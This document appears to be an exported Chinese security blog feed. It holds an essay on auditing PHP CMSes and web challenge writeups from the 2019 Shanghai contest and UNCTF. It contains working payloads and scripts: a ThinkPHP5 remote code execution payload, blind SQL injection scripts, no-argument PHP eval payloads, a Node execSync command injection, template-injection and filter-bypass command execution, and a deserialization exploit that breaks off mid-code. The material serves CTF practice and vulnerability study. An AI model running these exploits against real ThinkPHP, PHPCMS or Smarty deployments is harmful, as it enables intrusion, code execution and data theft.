    <url>/2019/11/04/%E5%AF%B9%E7%8E%B0%E4%BB%A3WEB%E6%A1%86%E6%9E%B6-CMS%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>团队分享，不能随便水，原文有误还请师傅们扶正，希望师傅们喜欢。</p><p>本想着挖几个0day(哪有那么容易唉)</p><p>传统的cms直接定位危险函数就能快速审计出利用链。然而现代cms直接定位危险函数往往溯源无果(安全意识的提高,我太菜了)，最近头铁有去瞒挖，很是吃力，于是想着多分析师傅们挖的漏洞，收集一些挖掘思路。</p><p>挖掘困难，那就要考虑一些整体特性，我认为比较好利用有下面，以下举出的案例都是我分析复现</p><ol><li>动态函数调用，可能造成rce…，结合繁杂的类，类变量覆盖、任意敏感类调用….</li><li>缓存/日志/配置文件，可能造成代码注入….</li><li>身份认证,遇到需要身份认证操作，不一定解加密函数，尝试寻找其他调用身份认证点，可能存在伪造或者欺骗。</li><li>反序列化，存在众多类可以当做跳板，而后锁定漏洞点。</li></ol><h1 id="案例一-类变量覆盖-动态函数"><a href="#案例一-类变量覆盖-动态函数" class="headerlink" title="案例一(类变量覆盖+动态函数)"></a>案例一(类变量覆盖+动态函数)</h1><h2 id="Thinkphp5-远程代码执行"><a href="#Thinkphp5-远程代码执行" class="headerlink" title="Thinkphp5 远程代码执行"></a>Thinkphp5 远程代码执行</h2><p>Thinkphp5多版本存在远程代码执行漏洞，其中漏洞点重要利用就是类变量覆盖和函数动态执行，最后锁定call_user_func触发漏洞。分析见图。</p><p>payload:<code>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al</code></p><p><img src="./tp.png" srcset="/img/loading.gif" alt="tp"></p><h1 id="案例二-动态函数调用"><a href="#案例二-动态函数调用" class="headerlink" title="案例二(动态函数调用)"></a>案例二(动态函数调用)</h1><h2 id="PHPCMS-v9-6-0-任意文件上传"><a href="#PHPCMS-v9-6-0-任意文件上传" class="headerlink" title="PHPCMS v9.6.0 任意文件上传"></a>PHPCMS v9.6.0 任意文件上传</h2><p>审计时候以为任意文件上传直接搜索<code>move_upload_file</code>可以发现漏洞点，最后发现自己还是太年轻了。藏的很深的动态函数调用。这里给出利用链分析图，具体分析参考：<a href="https://zhzhdoai.github.io/2019/10/10/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">历史漏洞分析之PHPCMS v9.6.0 任意文件上传</a></p><p><img src="./phpcms.png" srcset="/img/loading.gif" alt="phpcms"></p><h1 id="案例三-身份认证绕过"><a href="#案例三-身份认证绕过" class="headerlink" title="案例三(身份认证绕过)"></a>案例三(身份认证绕过)</h1><p><strong>phpcms v9.6.0　sql注入漏洞</strong>分析下来很有趣，其中需要身份伪造,利用思路很像<a href="https://zhzhdoai.github.io/2019/03/08/Dedecms-cookie%E4%BC%AA%E9%80%A0%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%89%8D%E5%8F%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">Dedecms | cookie伪造导致任意前台用户登录</a>.该漏洞提供给我们一个思路，<strong>身份认证相关方法如果使用不当能会导致垂直越权或者危险操作限制bypass，多发生在cookie生成</strong></p><p>漏洞点：<strong>phpcms/modules/content/down.php</strong>  </p><p>$a_k参数可控，经过DECODE解密，秘钥是<code>pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)</code>，不存在解密可能，可以<strong>考虑伪造!!!</strong></p><p><img src="./1.png" srcset="/img/loading.gif" alt="1"></p><p><code>$a_k</code>参数经过<code>parse_str</code>后会造成<strong>变量覆盖且存在解码url编码操作</strong>。可以使得<code>$id</code>参数覆盖为恶意值，带入<code>get_one</code>方法进行数据库查询，由于加密算法存在，无法直接构造注入语句，需要找到<code>sys_auth($可控,&#39;ENCODE&#39;)</code>将注入语句加密。</p><blockquote><p>全局搜索<code>sys_auth</code>方法，该方法可能会在其他位置调用要求<strong>加密值可控，相同秘钥，可输出</strong></p></blockquote><p><img src="./asdpng.png" srcset="/img/loading.gif" alt="asdpng"></p><p>满足以上条件只有一处，位于<strong>phpcms/libs/classes/param.class.php</strong>方法<code>set_cookie</code></p><p><img src="./1570782767714.png" srcset="/img/loading.gif" alt="1570782767714"></p><p>之后利用可以参考：<a href="https://zhzhdoai.github.io/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/">历史漏洞分析之PHPCMS v9.6.0 SQL注入</a></p><h1 id="案例四-缓存文件"><a href="#案例四-缓存文件" class="headerlink" title="案例四(缓存文件)"></a>案例四(缓存文件)</h1><h2 id="smarty-lt-3-32-rce"><a href="#smarty-lt-3-32-rce" class="headerlink" title="smarty&lt;=3.32 rce"></a>smarty&lt;=3.32 rce</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>文件名可控=&gt;导致文件路径可控=&gt;注入$output编译文件，闭合注释符号=&gt;编译后执行包含，直接造成代码注入</p><p>具体参考链接：<a href="https://mochazz.github.io/2019/10/28/Smarty3.1.31RCE(CVE-2017-1000480)/" target="_blank" rel="noopener">Smarty&lt;=3.1.31 RCE(CVE-2017-1000480)</a></p><p><img src="./1572450086584-1572806561380.png" srcset="/img/loading.gif" alt="1572450086584"></p><h1 id="案例五-反序列化"><a href="#案例五-反序列化" class="headerlink" title="案例五(反序列化)"></a>案例五(反序列化)</h1><h2 id="Thinkphp5-2反序列化"><a href="#Thinkphp5-2反序列化" class="headerlink" title="Thinkphp5.2反序列化"></a>Thinkphp5.2反序列化</h2><p>我还是觉得图片分析更直观，而且网上挺多文章都分析烂了，图片分析比较少，就悄咪咪画了下。</p><p>参考分析可以参考博客文章：<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">ThinkPHP 5.2反序列化</a></p><p><img src="./last.jpg" srcset="/img/loading.gif" alt="last"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>为了随手甩0day而奋斗!!!!</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019上海大学生网络安全竞赛web题解</title>
    <link href="/2019/11/03/2019%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/11/03/2019%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web较简单，在这里做下记录</p><h1 id="easySql"><a href="#easySql" class="headerlink" title="easySql"></a>easySql</h1><p>考点：无列名注入、innob利用、绕waf</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringurl = <span class="hljs-string">"http://47.105.183.208:29898/article.php"</span>str1 = string.printableresult = <span class="hljs-string">''</span><span class="hljs-comment"># 0'+||+ascii(substring(user()+from+2))=112+||+'0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str1:        <span class="hljs-comment">#id = "0' || ascii(substring((select group_concat(table_name) from mysql.innodb_table_stats) from %d))=%d || '0"%(i,ord(j))</span>        <span class="hljs-comment">#id = "0' || ascii(substring((select group_concat(database_name) from mysql.innodb_table_stats) from %d))=%d || '0"%(i,j)</span>        <span class="hljs-comment">#id = "0' || ascii(substring((select group_concat(*) from fl111aa44a99g) from %d))=%d || '0"%(i,ord(j))</span>        <span class="hljs-comment">#id = "0' || ascii(substring((select group_concat(database_name) from mysql.innodb_table_stats) from %d))=%d || '0"%(i,ord(j))</span>        <span class="hljs-comment">#id = "0' || ascii(substring((select group_concat(e.2) from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e join (select 6)f union select * from fl111aa44a99g)e) from %d))=%d || '0"%(i,ord(j))</span>        <span class="hljs-comment">#id = "0' || ascii(substring((select group_concat(e.2) from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e union select * from fl111aa44a99g)e) from %d))=%d || '0"%(i,ord(j))</span>        id = <span class="hljs-string">f"0' || ascii(substring((select group_concat(e.3) from (select * from (select 1)a join (select 2)b join (select 3)c union/**/select  * from cccttffff.fl111aa44a99g)e) from <span class="hljs-subst">&#123;i&#125;</span>))=<span class="hljs-subst">&#123;ord(j)&#125;</span> || '0"</span>        <span class="hljs-comment">#id = f"0' || ascii(substring((Version()) from &#123;i&#125;))=&#123;ord(j)&#125; || '0"</span>                param = &#123;            <span class="hljs-string">'id'</span>:id        &#125;        rep = requests.get(url,params=param)        <span class="hljs-comment">#print(rep.text)</span>        print(param)        <span class="hljs-keyword">if</span> <span class="hljs-string">'23333333'</span> <span class="hljs-keyword">in</span> rep.text:            result+=j            print(result)            <span class="hljs-keyword">break</span></code></pre><h1 id="babyt5"><a href="#babyt5" class="headerlink" title="babyt5"></a>babyt5</h1><p>考点：ssrf、gopher写shell</p><p>原题：<a href="https://www.jianshu.com/p/804d95f6d6fb" target="_blank" rel="noopener">https://www.jianshu.com/p/804d95f6d6fb</a></p><p><img src="./1572770331858.png" srcset="/img/loading.gif" alt="1572770331858"></p><h1 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h1><p>考点：无参数rce</p><p>环境:php5、debian</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$code = $_GET[<span class="hljs-string">'code'</span>];<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($code)) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $code)) &#123;            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;                    <span class="hljs-keyword">echo</span> <span class="hljs-string">'bye~'</span>;                &#125; <span class="hljs-keyword">else</span> &#123;                    var_dump($code);                    <span class="hljs-keyword">eval</span>($code);                &#125;            &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"No way!!!"</span>;        &#125;&#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"No way!!!"</span>;    &#125;</code></pre><p>需要先构造出能够切换目录的符号，如<code>“/” &quot;.&quot;</code></p><p><img src="./1572770778152.png" srcset="/img/loading.gif" alt="1572770778152"></p><p>file函数替代readfile</p><p>payload:</p><pre><code class="hljs php"><span class="hljs-keyword">die</span>(next(file(end(scandir(chr(ord(strrev(crypt(serialize(<span class="hljs-keyword">array</span>(chdir(next(scandir(next(scandir(chr(ord(strrev(crypt(serialize(<span class="hljs-keyword">array</span>())))))))))))))))))))));</code></pre><p>payload:</p><pre><code class="hljs php"><span class="hljs-keyword">echo</span>(implode(file(end(scandir(chr(ceil(sinh(cosh(tan(ceil(sinh(sinh(cosh(ord(phpversion(chdir(next(scandir(next(scandir(chr(ceil(sinh(cosh(tan(floor(abs(tan(cosh(floor(phpversion())))))))))))))))))))))))))))))));</code></pre><h1 id="lol2"><a href="#lol2" class="headerlink" title="lol2"></a>lol2</h1><p>未解决</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019UNCTF WEB题解</title>
    <link href="/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h1><p>利用update处存在盲注，修改密码后，注入布尔语句回显不一致</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> randomstr1= string.printable<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">regestr</span><span class="hljs-params">(username)</span>:</span>    urlregester = <span class="hljs-string">"http://101.71.29.5:10002/login_create.php"</span>    data1 = &#123;        <span class="hljs-string">'username'</span>:username,        <span class="hljs-string">'password'</span>:<span class="hljs-string">'zxasqw159'</span>,        <span class="hljs-string">'re_password'</span>:<span class="hljs-string">'zxasqw159'</span>,        <span class="hljs-string">'submit'</span>:<span class="hljs-string">'Register'</span>    &#125;    repregester = requests.post(urlregester,data=data1)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Register</span><span class="hljs-params">(username)</span>:</span>    urlregester = <span class="hljs-string">"http://101.71.29.5:10002/login_create.php"</span>    data1 = &#123;        <span class="hljs-string">'username'</span>:username,        <span class="hljs-string">'password'</span>:<span class="hljs-string">'zxasqw159'</span>,        <span class="hljs-string">'re_password'</span>:<span class="hljs-string">'zxasqw159'</span>,        <span class="hljs-string">'submit'</span>:<span class="hljs-string">'Register'</span>    &#125;    repregester = rep.post(urlregester,data=data1)    sess=repregester.headers[<span class="hljs-string">'Set-Cookie'</span>][<span class="hljs-number">10</span>:<span class="hljs-number">36</span>]    <span class="hljs-keyword">return</span> sess<span class="hljs-comment"># first to register  new username id</span>result=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1:        rep=requests.session()        a=random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">9999999</span>)        username2 = <span class="hljs-string">f'c888<span class="hljs-subst">&#123;str(a)&#125;</span>'</span>        <span class="hljs-comment">#print(username2)</span>        regestr(username2)        <span class="hljs-comment">#username2 = f"oswor&#123;str(a)&#125;' &amp;&amp; ascii(substr((select group_concat(`1`) from (select 1 union select * from fl4g)redforce),&#123;j&#125;,1))=&#123;ord(i)&#125;#"</span>        username2 = <span class="hljs-string">f"c888<span class="hljs-subst">&#123;str(a)&#125;</span>' &amp;&amp; ascii(substr((select e.1 from (select * from (select 1)a union select * from fl4g)e limit 1 offset 1),<span class="hljs-subst">&#123;j&#125;</span>,1))=<span class="hljs-subst">&#123;ord(i)&#125;</span>#"</span>        cookies=&#123;            <span class="hljs-string">'PHPSESSID'</span>:Register(username2),            <span class="hljs-string">'Auth'</span>:<span class="hljs-string">'1'</span>        &#125;        urllogin=<span class="hljs-string">"http://101.71.29.5:10002/login.php"</span>        data2 = &#123;            <span class="hljs-string">'login_user'</span>:username2,            <span class="hljs-string">'login_password'</span>:<span class="hljs-string">'zxasqw159'</span>,            <span class="hljs-string">'mysubmit'</span>:<span class="hljs-string">'Login'</span>        &#125;        urllogin = rep.post(url=urllogin,data=data2)        replogin = urllogin.text        print(username2)        <span class="hljs-comment">#print(cookies)</span>        urlchange = <span class="hljs-string">"http://101.71.29.5:10002/pass_change.php"</span>        data3= &#123;            <span class="hljs-string">"current_password"</span>:<span class="hljs-string">'zxasqw159'</span>,            <span class="hljs-string">"password"</span>:<span class="hljs-string">'123456'</span>,            <span class="hljs-string">"re_password"</span>:<span class="hljs-string">'123456'</span>,            <span class="hljs-string">'submit'</span>:<span class="hljs-string">'Reset'</span>        &#125;        repchange= rep.post(urlchange,data=data3,cookies=cookies)        <span class="hljs-keyword">if</span> <span class="hljs-string">"successfully"</span> <span class="hljs-keyword">in</span> repchange.text:            result+=i            print(result)            <span class="hljs-keyword">break</span></code></pre><p>UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}</p><p><img src="./1571658224467.png" srcset="/img/loading.gif" alt="1571658224467"></p><h1 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h1><p>原题</p><p>参考链接：</p><p><a href="https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0" target="_blank" rel="noopener">https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0</a></p><p><a href="https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0" target="_blank" rel="noopener">https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0</a></p><p>GophSql常用语句测试</p><pre><code class="hljs less">&#123;<span class="hljs-selector-tag">__schema</span>&#123;<span class="hljs-selector-tag">types</span>&#123;<span class="hljs-selector-tag">name</span>,<span class="hljs-selector-tag">fields</span>&#123;<span class="hljs-selector-tag">name</span>&#125;&#125;&#125;&#125;<span class="hljs-selector-tag">mutation</span>&#123;<span class="hljs-selector-tag">updateMemoInfo</span>(<span class="hljs-attribute">mid</span>:<span class="hljs-number">1</span>,<span class="hljs-attribute">title</span>:<span class="hljs-string">"1' or sleep(3)#"</span>)&#123;<span class="hljs-selector-tag">ok</span>&#125;&#125;</code></pre><p>原因为类控制不完全，导致可以读到隐藏数据</p><p>比赛链接:<a href="http://101.71.29.5:10012/" target="_blank" rel="noopener">http://101.71.29.5:10012</a></p><pre><code class="hljs crmsh">query&#123;allUsers&#123;    edges&#123;      <span class="hljs-keyword">node</span><span class="hljs-title">&#123;</span><span class="hljs-title">        id</span>        username        memos&#123;          page<span class="hljs-literal">Inf</span>o&#123;            startCursor            endCursor          &#125;          edges&#123;            cursor            <span class="hljs-keyword">node</span><span class="hljs-title">&#123;</span><span class="hljs-title">              id</span>              content              title              private              userId            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;</code></pre><p><img src="./1571676027779.png" srcset="/img/loading.gif" alt="1571676027779"></p><h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>找到交互的点，只有calc</p><p>需要将空格替换掉，否则会爆undefined，使用了split分割e</p><p><code>/calc require(&#39;child_process&#39;).execSync(&#39;cat${IFS}/flag&#39;).toString(&quot;utf8&quot;).trim()</code></p><p><img src="./1571743400336.png" srcset="/img/loading.gif" alt="1571743400336"></p><p><img src="./1571742560376.png" srcset="/img/loading.gif" alt="1571742560376"></p><h1 id="审计一下世界上最好的语言吧"><a href="#审计一下世界上最好的语言吧" class="headerlink" title="审计一下世界上最好的语言吧"></a>审计一下世界上最好的语言吧</h1><p>匹配<code>&quot;/{if:(.*?)}(.*?){end if}/is&quot;</code></p><p><img src="./1571821164683.png" srcset="/img/loading.gif" alt="1571821164683"></p><p>截取字符进行替换拼接</p><p><img src="./1571821199927.png" srcset="/img/loading.gif" alt="1571821199927"></p><p>在看模板，可以看到<code>{haha:searchword}与{haha:searchnum}</code>是紧挨的状态，可以利用此处进行正则匹配</p><p><img src="./1571821248927.png" srcset="/img/loading.gif" alt="1571821248927"></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs php">http:<span class="hljs-comment">//101.71.29.5:10003/?content=%3Csearch%3E&#123;i&#123;haha:type&#125;%3C/search%3E&amp;searchnum=&#123;end%20if&#125;&amp;type=f:phpinfo()&#125;</span></code></pre><p><img src="./1571820152303.png" srcset="/img/loading.gif" alt="1571820152303"></p><pre><code class="hljs http">http://101.71.29.5:10003/?content=&lt;search&gt;&#123;i&#123;haha:type&#125;.php')&#125;&lt;/search&gt;&amp;searchnum=&#123;end if&#125;&amp;type=f:readfile('flag</code></pre><p><img src="./1571821143763.png" srcset="/img/loading.gif" alt="1571821143763"></p><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>考点是利用正则匹配中 <code>\\</code> 匹配不到<code>\</code> ，这题刚放出来存在bug，由于<code>\\</code> 存在原因直接将<code>反引号</code>释放出来。直接利用反引号和通配符执行命令</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    $a = $_GET[<span class="hljs-string">'a'</span>];    $b = $_GET[<span class="hljs-string">'b'</span>]; <span class="hljs-comment">// try bypass it</span>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))        $a = <span class="hljs-string">""</span>;        $a =<span class="hljs-string">'"'</span> . $a . <span class="hljs-string">'"'</span>;    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))        $b = <span class="hljs-string">""</span>;        $b = <span class="hljs-string">'"'</span> . $b . <span class="hljs-string">'"'</span>;     $cmd = <span class="hljs-string">"file $a $b"</span>;     var_dump($cmd);      str_replace(<span class="hljs-string">" "</span>,<span class="hljs-string">""</span>,<span class="hljs-string">"$cmd"</span>);      system($cmd);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs bin">a&#x3D;&#96;&#x2F;bi?&#x2F;gr?p+-R+ctf&#96;</code></pre><p><img src="./1571918707614.png" srcset="/img/loading.gif" alt="1571918707614"></p><h2 id="题目修改后"><a href="#题目修改后" class="headerlink" title="题目修改后"></a>题目修改后</h2><p><code>\</code> 转义双引号，<code>%20#</code>为命令终止符号逃逸最后一个双引号执行命令的限制。</p><p><img src="./1572001510478.png" srcset="/img/loading.gif" alt="1572001510478"></p><h1 id="easy-pentest"><a href="#easy-pentest" class="headerlink" title="easy_pentest"></a>easy_pentest</h1><ol><li>利用tp生成的日志，信息泄露</li></ol><p><img src="./1572166521292.png" srcset="/img/loading.gif" alt="1572166521292"></p><ol start="2"><li>利用tp rce 读取waf.php</li></ol><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">/** </span><span class="hljs-comment"> * 检测php标记和php函数 </span><span class="hljs-comment"> *   </span><span class="hljs-comment"> */</span> $into_safe = <span class="hljs-keyword">FALSE</span>; $safe_key_name = <span class="hljs-string">"safe_key"</span>; $safe_key = <span class="hljs-string">"easy_pentesnt_is_s0fun"</span>; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_attack_keyword</span><span class="hljs-params">($str)</span></span>&#123;     $parrten_str = <span class="hljs-string">"/[&lt;?]\bphp\b|^&lt;[?]=.*$|^&lt;[?].*$|\bphpinfo\b|\bbase64_decode\b|\bfile_get_contents\b|\breadfile\b|\bfile\b|\bfopen\b|\bconvert_uuencode\b|^.*php:\/\/.*$/i"</span>;    <span class="hljs-keyword">if</span> (preg_match($parrten_str,$str))&#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">"this way is too easy!"</span>);     &#125;  &#125; <span class="hljs-comment">//check safekey  </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_safe_key</span><span class="hljs-params">($str_k,$str_v)</span></span>&#123;     <span class="hljs-keyword">global</span> $safe_key_name,$safe_key;     <span class="hljs-keyword">if</span> ($str_k == $safe_key_name &amp;&amp; $str_v == $safe_key)&#123;         <span class="hljs-keyword">return</span> <span class="hljs-keyword">TRUE</span>;     &#125; &#125; <span class="hljs-comment">//safe redirect </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_safe</span><span class="hljs-params">($safe_state)</span></span>&#123;     <span class="hljs-keyword">if</span>($safe_state)&#123;         <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script type='text/javascript'&gt;"</span>;         <span class="hljs-keyword">echo</span> <span class="hljs-string">"window.location.href='/public/static/is_safe_page.html';"</span>;         <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/script&gt;"</span>;     &#125;<span class="hljs-keyword">else</span>&#123;         <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script type='text/javascript'&gt;"</span>;         <span class="hljs-keyword">echo</span> <span class="hljs-string">"window.location.href='/public/static/not_safe.html';"</span>;         <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/script&gt;"</span>;         <span class="hljs-keyword">die</span>();     &#125; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;     <span class="hljs-keyword">global</span> $into_safe;     <span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;                  <span class="hljs-keyword">if</span>(is_array($value))&#123;             <span class="hljs-keyword">foreach</span>($value <span class="hljs-keyword">as</span> $k =&gt; $v)&#123;                 <span class="hljs-keyword">if</span>(check_safe_key($k,$v))&#123;                     $into_safe = <span class="hljs-keyword">TRUE</span>;                 &#125;                 check_attack_keyword($v);             &#125;         &#125;         <span class="hljs-keyword">else</span>&#123;             <span class="hljs-keyword">if</span>(check_safe_key($key,$value))&#123;                 $into_safe = <span class="hljs-keyword">TRUE</span>;             &#125;             check_attack_keyword($value);         &#125;     &#125;          is_safe($into_safe);               <span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;         <span class="hljs-keyword">if</span>(is_array($value))&#123;             <span class="hljs-keyword">foreach</span>($value <span class="hljs-keyword">as</span> $k =&gt; $v)&#123;                 check_attack_keyword($v);             &#125;         &#125;         <span class="hljs-keyword">else</span>&#123;             check_attack_keyword($value);         &#125;     &#125;      &#125; main(); <span class="hljs-meta">?&gt;</span></code></pre><h2 id="getshell思路"><a href="#getshell思路" class="headerlink" title="getshell思路"></a>getshell思路</h2><p>参考文章：<a href="https://xz.aliyun.com/t/6106" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106</a></p><p>php7 无法执行assert</p><ol><li><p>日志无法写入</p></li><li><p>禁用常见危险函数</p></li><li><p>&lt;?php  &lt;?  file被过滤</p></li><li><pre><code>/[&lt;?]\bphp\b|^&lt;[?]=.*$|^&lt;[?].*$|\bphpinfo\b|\bbase64_decode\b|\bfile_get_contents\b|\breadfile\b|\bfile\b|\bfopen\b|\bconvert_uuencode\b|^.*php:\/\/.*$/i<pre><code class="hljs markdown"><span class="hljs-bullet">5. </span>利用filter[] 多处理，这道题把<span class="hljs-code">`Session::set`</span>给删了，写不了shell。但是依然生成PHPSESSID，在探测temp目录发现没有权限，其实就可以确定session文件写在这里面![<span class="hljs-string">1572070684595</span>](<span class="hljs-link">./1572070684595.png</span>)找flag文件</code></pre>http://101.71.29.5:10021/public/index.php?safe_key=easy_pentesnt_is_s0fun&amp;s=capcha</code></pre></li></ol><p>_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=-1&amp;get[]=/home/</p><pre><code class="hljs">![1572070928246](./1572070928246.png)</code></pre><p>/home/flag_1sh3r3.txt</p><pre><code class="hljs">读取可以用`think\__include_file` 也可以`show_source````httphttp://101.71.29.5:10021/public/index.php?safe_key=easy_pentesnt_is_s0fun&amp;s=capcha_method=__construct&amp;method=get&amp;filter[]=show_source&amp;server[]=-1&amp;get[]=/home/flag_1sh3r3.txt# flag&#123;9d35311fd3a12a9f81z6bfe4117e5540&#125;</code></pre><p><img src="./1572071033980.png" srcset="/img/loading.gif" alt="1572071033980"></p><h1 id="k-amp-k"><a href="#k-amp-k" class="headerlink" title="k&amp;k"></a>k&amp;k</h1><p>m参数消毒不完全，直接伪协议扒光所有代码。</p><p>1.存在备份文件access.php.bak</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="./99.png" srcset="/img/loading.gif" alt=""></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">debug</span></span>&#123;    <span class="hljs-keyword">public</span> $funny = <span class="hljs-string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;&#125;'</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">session</span></span>&#123;    <span class="hljs-keyword">public</span> $username;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username=(<span class="hljs-keyword">new</span> debug());    &#125;&#125;$a=<span class="hljs-keyword">new</span> session();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-keyword">echo</span> <span class="hljs-string">"\r\n"</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cookie_encode</span><span class="hljs-params">($str)</span> </span>&#123;$key = base64_encode($str);$key = bin2hex($key);$arr = str_split($key, <span 